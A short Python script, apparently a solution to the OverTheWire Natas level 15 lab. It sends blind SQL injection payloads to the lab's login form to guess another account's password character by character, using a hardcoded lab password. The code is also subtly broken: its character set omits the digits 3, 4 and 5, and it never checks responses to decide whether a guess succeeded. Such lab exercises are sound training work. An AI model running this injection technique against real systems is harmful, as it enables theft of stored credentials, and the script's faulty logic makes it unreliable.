
import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0126789'
username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
url = 'http://natas15.natas.labs.overthewire.org/index.php?debug'

for char in chars:
    Data = {'username': 'natas16" and password LIKE BINARY "' + char + '%" #'}
    success = False
    while not success:
        try:
            r = requests.post(url, auth=HTTPBasicAuth(username, password), data=Data)
            if r.status_code == 200:
                success = True
        except requests.exceptions.RequestException as e:
            print(f"An error occurred: {e}")
           
